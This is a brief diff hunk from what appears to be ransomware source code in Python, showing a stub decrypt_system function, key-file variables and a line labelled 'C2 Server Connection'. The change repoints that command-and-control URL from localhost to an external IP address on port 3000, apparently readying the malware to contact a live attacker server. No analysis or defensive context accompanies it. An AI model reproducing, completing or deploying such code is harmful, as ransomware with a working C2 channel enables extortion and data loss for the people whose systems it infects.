@@ -50,7 +50,7 @@ def decrypt_system(key):
     pass
 
 # C2 Server Connection
-url = 'http://localhost:3000/'
+url = 'http://34.66.45.94:3000/'
 pub_path = "./pub_key.pem"
 priv_key = None
 
